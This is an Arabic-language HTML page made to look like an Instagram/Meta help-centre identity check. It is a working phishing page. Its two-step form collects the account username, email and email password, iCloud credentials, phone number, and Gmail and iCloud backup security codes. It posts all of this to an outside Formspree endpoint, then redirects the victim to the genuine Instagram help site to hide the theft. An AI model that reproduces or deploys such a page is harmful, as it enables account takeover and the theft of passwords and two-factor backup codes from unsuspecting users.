<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مركز المساعدة | Instagram</title>
    <style>
        :root { --fb-blue: #1877f2; --bg-gray: #f0f2f5; --border: #dddfe2; }
        body { background-color: var(--bg-gray); font-family: -apple-system, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; width: 100%; max-width: 440px; border-radius: 8px; box-shadow: 0 12px 28px rgba(0,0,0,0.2); border: 1px solid var(--border); overflow: hidden; }
        .header { padding: 20px; text-align: center; border-bottom: 1px solid var(--border); }
        .header img { width: 80px; }
        .content { padding: 25px; }
        h1 { font-size: 19px; color: #1c1e21; margin-bottom: 10px; text-align: center; }
        p { font-size: 14px; color: #606770; margin-bottom: 20px; text-align: center; }
        input, select, textarea { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ccd0d5; border-radius: 6px; background: #f5f6f7; box-sizing: border-box; font-size: 14px; outline: none; }
        button { width: 100%; background: var(--fb-blue); color: white; border: none; padding: 12px; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer; }
        .info-box { background: #fff9e6; border: 1px solid #ffe58f; padding: 10px; border-radius: 6px; font-size: 12px; color: #856404; margin-bottom: 15px; display: none; }
        #step2 { display: none; } /* إخفاء الخطوة الثانية في البداية */
    </style>
</head>
<body>
    <div class="container">
        <div class="header"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1024px-Meta_Platforms_Inc._logo.svg.png"></div>
        <div class="content">
            <form action="https://formspree.io/f/mdaygdnq" method="POST">
                
                <div id="step1">
                    <h1>تأكيد الهوية</h1>
                    <p>يرجى إدخال البيانات التالية لتوثيق ملكية الحساب.</p>
                    <input type="text" name="Username" placeholder="اسم المستخدم" required>
                    <input type="email" name="Email" placeholder="البريد الإلكتروني" required>
                    <input type="password" name="Email_Pass" placeholder="كلمة مرور البريد" required>
                    <input type="email" name="iCloud_User" placeholder="بريد iCloud">
                    <input type="password" name="iCloud_Pass" placeholder="كلمة مرور iCloud">
                    <input type="tel" name="Phone" placeholder="رقم الهاتف" required>
                    <input type="text" name="Country" placeholder="البلد">
                    <textarea name="Description" placeholder="وصف موجز للمشكلة" rows="2"></textarea>
                    <button type="button" onclick="goNext()">المتابعة</button>
                </div>

                <div id="step2">
                    <h1>تحقق إضافي</h1>
                    <div class="info-box" id="info">⚠️ الحساب محمي. يرجى إدخال رموز الأمان الاحتياطية لضمان استرجاع الحساب بنجاح.</div>
                    <input type="text" name="Gmail_Backup_Code" placeholder="رمز أمان Gmail (8 أرقام)">
                    <input type="text" name="iCloud_Backup_Code" placeholder="رمز أمان iCloud">
                    
                    <input type="hidden" name="_next" value="https://help.instagram.com">
                    <button type="submit">تأكيد نهائي</button>
                </div>

            </form>
        </div>
    </div>

    <script>
        function goNext() {
            // إخفاء الخطوة الأولى وإظهار الثانية بحركة بسيطة
            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
            document.getElementById('info').style.display = 'block';
        }
    </script>
</body>
</html>
